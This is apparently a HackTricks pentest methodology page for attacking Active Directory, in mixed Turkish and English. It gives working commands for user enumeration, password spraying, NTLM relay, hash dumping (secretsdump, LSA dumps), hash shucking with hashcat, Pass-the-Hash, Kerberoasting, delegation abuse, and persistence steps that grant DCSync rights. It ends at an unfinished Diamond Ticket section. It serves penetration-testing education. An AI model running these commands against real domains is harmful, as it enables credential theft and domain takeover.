# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Temel genel bakış

**Active Directory**, **ağ yöneticilerinin** bir ağ içinde **domain**ler, **user**lar ve **object**ler oluşturup yönetmesini verimli şekilde sağlayan temel bir teknolojidir. Ölçeklenebilir olacak şekilde tasarlanmıştır; çok sayıda kullanıcıyı yönetilebilir **group**lar ve **subgroup**lar halinde düzenlemeyi kolaylaştırırken, farklı seviyelerde **access rights** kontrolü sağlar.

**Active Directory** yapısı üç ana katmandan oluşur: **domain**ler, **tree**ler ve **forest**lar. Bir **domain**, **user**lar veya **device**lar gibi, ortak bir veritabanını paylaşan object koleksiyonunu kapsar. **Tree**ler, ortak bir yapı ile birbirine bağlanan bu domain gruplarıdır ve bir **forest**, **trust relationships** ile birbirine bağlanan birden fazla tree koleksiyonunu temsil eder; organizasyon yapısının en üst katmanını oluşturur. Bu seviyelerin her birinde belirli **access** ve **communication rights** atanabilir.

**Active Directory** içindeki temel kavramlar:

1. **Directory** – Active Directory objectleriyle ilgili tüm bilgileri barındırır.
2. **Object** – Directory içindeki varlıkları ifade eder; bunlara **user**lar, **group**lar veya **shared folder**lar dahildir.
3. **Domain** – Directory objectleri için bir konteyner görevi görür; bir **forest** içinde birden fazla domain bir arada bulunabilir ve her biri kendi object koleksiyonunu korur.
4. **Tree** – Ortak bir root domain paylaşan domain gruplaması.
5. **Forest** – Active Directory’de organizasyon yapısının zirvesi; aralarında **trust relationships** bulunan birkaç tree’den oluşur.

**Active Directory Domain Services (AD DS)**, bir ağ içinde merkezi yönetim ve iletişim için kritik olan bir dizi hizmeti kapsar. Bu hizmetler şunları içerir:

1. **Domain Services** – Veri depolamayı merkezileştirir ve **user**lar ile **domain**ler arasındaki etkileşimleri yönetir; buna **authentication** ve **search** işlevleri dahildir.
2. **Certificate Services** – Güvenli **digital certificate**ların oluşturulmasını, dağıtımını ve yönetimini denetler.
3. **Lightweight Directory Services** – **LDAP protocol** üzerinden directory-enabled uygulamaları destekler.
4. **Directory Federation Services** – Kullanıcıların bir oturumda birden fazla web application arasında kimliğini doğrulamak için **single-sign-on** yetenekleri sağlar.
5. **Rights Management** – Telif hakkı materyallerini yetkisiz dağıtım ve kullanıma karşı düzenleyerek korumaya yardımcı olur.
6. **DNS Service** – **domain name**lerin çözümlemesi için kritik öneme sahiptir.

Daha ayrıntılı açıklama için bakın: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Bir **AD**ye nasıl **attack** edileceğini öğrenmek için **Kerberos authentication process**i gerçekten iyi **understand** etmeniz gerekir.\
[**How it works bilmediyseniz bu sayfayı okuyun.**](kerberos-authentication.md)

## Cheat Sheet

AD’yi enumerate/exploit etmek için çalıştırabileceğiniz komutlara hızlıca göz atmak adına [https://wadcoms.github.io/](https://wadcoms.github.io)’ya çok şey bakabilirsiniz.

> [!WARNING]
> Kerberos iletişimi, işlem gerçekleştirmek için **tam nitelikli ad (FQDN)** gerektirir. Bir makineye IP adresiyle erişmeye çalışırsanız, **NTLM kullanır ve kerberos kullanmaz**.

## Recon Active Directory (No creds/sessions)

Eğer bir AD ortamına erişiminiz varsa ama herhangi bir credentials/sessionınız yoksa şunları yapabilirsiniz:

- **Pentest the network:**
- Ağı tarayın, makineleri ve açık portları bulun ve **vulnerabilities**’leri **exploit** etmeye veya onlardan **credentials** çıkarmaya çalışın (örneğin, [printers could be very interesting targets](ad-information-in-printers.md).
- DNS’i enumerate etmek, domain içindeki web, printer, share, vpn, media vb. önemli serverlar hakkında bilgi verebilir.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Bunun nasıl yapılacağı hakkında daha fazla bilgi için Genel [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)’ye bakın.
- **smb services üzerinde null ve Guest access olup olmadığını kontrol edin** (bu modern Windows sürümlerinde çalışmaz):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bir SMB server’ı nasıl enumerate edeceğinize dair daha ayrıntılı bir rehber burada bulunabilir:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Ldap enumerate edin**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP’i nasıl enumerate edeceğinize dair daha ayrıntılı bir rehber burada bulunabilir (özellikle **anonymous access**’e dikkat edin):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Ağı poison edin**
- [**Responder ile servisleri impersonating ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) credentials toplayın
- [**relay attack**’i kötüye kullanarak**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) host’a erişin
- [**evil-S** ile sahte UPnP service’ler açarak**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) üzerinden credentials toplayın
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Domain ortamlarındaki ve ayrıca herkese açık kaynaklardaki iç document’lerden, social media’dan, service’lerden (özellikle web) username/name çıkarın.
- Şirket çalışanlarının tam isimlerini bulursanız, farklı AD **username convention**’larını deneyebilirsiniz (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). En yaygın convention’lar şunlardır: _NameSurname_, _Name.Surname_, _NamSur_ (her birinden 3 harf), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random harf ve 3 random number_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) ve [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) sayfalarına bakın.
- **Kerbrute enum**: **invalid username** istendiğinde server, **Kerberos error** kodu _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ ile yanıt verir; bu da username’in geçersiz olduğunu anlamamızı sağlar. **Valid usernames** ise ya bir **AS-REP** yanıtında **TGT**’yi ya da _KRB5KDC_ERR_PREAUTH_REQUIRED_ hatasını döndürür; bu da kullanıcının pre-authentication yapmasının gerektiğini gösterir.
- **MS-NRPC’ye karşı Authentication yok**: Domain controller’lardaki MS-NRPC (Netlogon) interface’ine karşı auth-level = 1 (No authentication) kullanılır. Yöntem, MS-NRPC interface’e bağlandıktan sonra `DsrGetDcNameEx2` fonksiyonunu çağırır ve herhangi bir credentials olmadan user veya computer’ın var olup olmadığını kontrol eder. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) aracı bu tür enumeration’ı uygular. Araştırma [burada](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf) bulunabilir
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Sunucusu**

Ağda bu sunuculardan birini bulduysanız, buna karşı **kullanıcı numaralandırması** da yapabilirsiniz. Örneğin, [**MailSniper**](https://github.com/dafthack/MailSniper) aracını kullanabilirsiniz:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Kullanıcı adlarının listelerini [**bu github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) ve bunu ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) içinde bulabilirsiniz.
>
> Ancak, bundan önce yapmış olmanız gereken recon adımından, şirkette çalışan **kişilerin adlarına** sahip olmalısınız. Ad ve soyad ile potansiyel geçerli kullanıcı adları üretmek için [**namemash.py**](https://gist.github.com/superkojiman/11076951) scriptini kullanabilirsiniz.

### Bir veya birkaç kullanıcı adını bilmek

Tamam, artık geçerli bir kullanıcı adınız var ama parola yok... O zaman deneyin:

- [**ASREPRoast**](asreproast.md): Eğer bir kullanıcının _DONT_REQ_PREAUTH_ attribute'u **yoksa**, o kullanıcı için içinde kullanıcının parolasının bir derivasyonu ile şifrelenmiş bazı veriler bulunan bir **AS_REP message** isteyebilirsiniz.
- [**Password Spraying**](password-spraying.md): Bulunan her kullanıcıyla en **yaygın parolaları** deneyelim; belki bir kullanıcı kötü bir parola kullanıyordur (parola politikasını unutmayın!).
- Ayrıca kullanıcıların posta sunucularına erişim elde etmeye çalışmak için **OWA servers** üzerinde de **spray** yapabileceğinizi unutmayın.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ağdaki bazı protokolleri **poisoning** yaparak bazı challenge **hashes** elde etmeyi başarabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory'yi enumerate etmeyi başardıysanız, **daha fazla email** ve **ağın daha iyi bir anlayışına** sahip olursunuz. AD ortamına erişim elde etmek için NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) zorlayabilirsiniz.

### NetExec workspace-driven recon & relay posture checks

- Engagment başına AD recon durumunu saklamak için **`nxcdb` workspaces** kullanın: `workspace create <name>`, `~/.nxc/workspaces/<name>` altında protokole göre SQLite DB'ler oluşturur (smb/mssql/winrm/ldap/etc). Görünümler arasında `proto smb|mssql|winrm` ile geçiş yapın ve toplanan secret'ları `creds` ile listeleyin. İşiniz bittiğinde hassas verileri manuel olarak temizleyin: `rm -rf ~/.nxc/workspaces/<name>`.
- **`netexec smb <cidr>`** ile hızlı subnet keşfi, **domain**, **OS build**, **SMB signing requirements** ve **Null Auth** bilgilerini ortaya çıkarır. `(signing:False)` gösteren üyeler **relay-prone**'dur, DC'ler ise çoğu zaman signing gerektirir.
- Hedeflemeyi kolaylaştırmak için **`/etc/hosts`** içindeki **hostnames**'leri doğrudan NetExec çıktısından oluşturun:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- **SMB relay to the DC signing ile engellendiğinde** bile **LDAP** durumunu kontrol edin: `netexec ldap <dc>` `(signing:None)` / zayıf channel binding değerlerini gösterir. SMB signing zorunlu ama LDAP signing devre dışı olan bir DC, **SPN-less RBCD** gibi abuses için hâlâ geçerli bir **relay-to-LDAP** hedefidir.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs bazen HTML içinde **maskelenmiş admin passwords** gömer. Kaynak/devtools görüntülemek cleartext’i açığa çıkarabilir (ör. `<input value="<password>">`), bu da scan/print repositories’e erişmek için Basic-auth kullanmayı sağlar.
- Alınan print jobs, kullanıcı başına passwords içeren **plaintext onboarding docs** barındırabilir. Test ederken eşleştirmeleri uyumlu tutun:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Active directory'yi enumerate etmeyi başardıysanız, **daha fazla e-postanız** ve **ağ hakkında daha iyi bir anlayışınız** olur. **NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)** zorlayabilirsiniz.**

### Looks for Creds in Computer Shares | SMB Shares

Şimdi bazı temel credentials'lara sahip olduğunuza göre, AD içinde paylaşılan herhangi bir **ilginç dosya** bulup bulamayacağınızı kontrol etmelisiniz. Bunu manuel olarak yapabilirsiniz ama bu çok sıkıcı, tekrarlayan bir iştir (ve yüzlerce belge kontrol etmeniz gerekiyorsa daha da kötü).

[**Kullanabileceğiniz tool'lar hakkında öğrenmek için bu linki takip edin.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Eğer diğer PC'lere veya share'lere **erişebiliyorsanız**, bir şekilde erişildiğinde size karşı bir NTLM authentication **tetikleyecek** (örneğin bir SCF dosyası gibi) **dosyalar** yerleştirebilirsiniz; böylece crack etmek için **NTLM challenge**'ını **çalabilirsiniz**:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Bu vulnerability, kimliği doğrulanmış herhangi bir kullanıcının **domain controller'ı compromise etmesine** izin veriyordu.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Aşağıdaki teknikler için sıradan bir domain user yeterli değildir, bu saldırıları gerçekleştirmek için bazı özel privileges/credentials gerekir.**

### Hash extraction

Umarım [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) dahil relay yapma, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [yerel olarak privileges yükseltme](../windows-local-privilege-escalation/index.html) kullanarak bir **local admin** hesabını compromise etmeyi başarmışsınızdır.\
Sonra, bellekten ve yereldeki tüm hash'leri dump etme zamanı gelmiştir.\
[**Hash'leri elde etmenin farklı yolları hakkında bu sayfayı okuyun.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Bir kullanıcının hash'ine sahip olduğunuzda**, onu **taklit etmek** için kullanabilirsiniz.\
Bu hash'i kullanarak **NTLM authentication gerçekleştirecek** bir **tool** kullanmanız gerekir, **ya da** yeni bir **sessionlogon** oluşturup bu hash'i **LSASS** içine **enjekte** edebilirsiniz; böylece herhangi bir **NTLM authentication** gerçekleştirildiğinde, o **hash kullanılacaktır.** Son seçenek mimikatz'ın yaptığı şeydir.\
[**Daha fazla bilgi için bu sayfayı okuyun.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Bu saldırı, yaygın Pass The Hash'in NTLM protocol üzerinden yapılmasına alternatif olarak, **kullanıcının NTLM hash'ini Kerberos ticket'ları istemek için kullanmayı** amaçlar. Bu nedenle, özellikle **NTLM protocol'ün devre dışı bırakıldığı** ve kimlik doğrulama protocol'ü olarak yalnızca **Kerberos'un izin verildiği** ağlarda **faydalı** olabilir.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** saldırı yönteminde, attackers bir kullanıcının password veya hash değerleri yerine **kimlik doğrulama ticket'ını çalar**. Bu çalınan ticket daha sonra **kullanıcıyı taklit etmek** için kullanılır ve ağ içindeki kaynaklara ve hizmetlere yetkisiz erişim sağlar.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Eğer bir **local administrator**'ın **hash**'ine veya **password**'üne sahipseniz, bununla diğer **PC**'lere **yerel olarak login** etmeyi denemelisiniz.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note that this is quite **noisy** and **LAPS** would **mitigate** it.

### MSSQL Abuse & Trusted Links

If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host (if running as SA), **steal** the NetNTLM **hash** or even perform a **relay** **attack**.\
Also, if a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. These trusts can be chained and at some point the user might be able to find a misconfigured database where he can execute commands.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory and deployment suites often expose powerful paths to credentials and code execution. See:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

If you find any Computer object with the attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) and you have domain privileges in the computer, you will be able to dump TGTs from memory of every users that logins onto the computer.\
So, if a **Domain Admin logins onto the computer**, you will be able to dump his TGT and impersonate him using [Pass the Ticket](pass-the-ticket.md).\
Thanks to constrained delegation you could even **automatically compromise a Print Server** (hopefully it will be a DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

If a user or computer is allowed for "Constrained Delegation" it will be able to **impersonate any user to access some services in a computer**.\
Then, if you **compromise the hash** of this user/computer you will be able to **impersonate any user** (even domain admins) to access some services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Having **WRITE** privilege on an Active Directory object of a remote computer enables the attainment of code execution with **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

The compromised user could have some **interesting privileges over some domain objects** that could let you **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Discovering a **Spool service listening** within the domain can be **abused** to **acquire new credentials** and **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

If **other users** **access** the **compromised** machine, it's possible to **gather credentials from memory** and even **inject beacons in their processes** to impersonate them.\
Usually users will access the system via RDP, so here you have how to performa couple of attacks over third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** provides a system for managing the **local Administrator password** on domain-joined computers, ensuring it's **randomized**, unique, and frequently **changed**. These passwords are stored in Active Directory and access is controlled through ACLs to authorized users only. With sufficient permissions to access these passwords, pivoting to other computers becomes possible.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** from the compromised machine could be a way to escalate privileges inside the environment:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

If **vulnerable templates** are configured it's possible to abuse them to escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Once you get **Domain Admin** or even better **Enterprise Admin** privileges, you can **dump** the **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Some of the techniques discussed before can be used for persistence.\
For example you could:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** creates a **legitimate Ticket Granting Service (TGS) ticket** for a specific service by using the **NTLM hash** (for instance, the **hash of the PC account**). This method is employed to **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

A **Golden Ticket attack** involves an attacker gaining access to the **NTLM hash of the krbtgt account** in an Active Directory (AD) environment. This account is special because it's used to sign all **Ticket Granting Tickets (TGTs)**, which are essential for authenticating within the AD network.

Once the attacker obtains this hash, they can create **TGTs** for any account they choose (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

These are like golden tickets forged in a way that **bypasses common golden tickets detection mechanisms.**


{{#ref}}
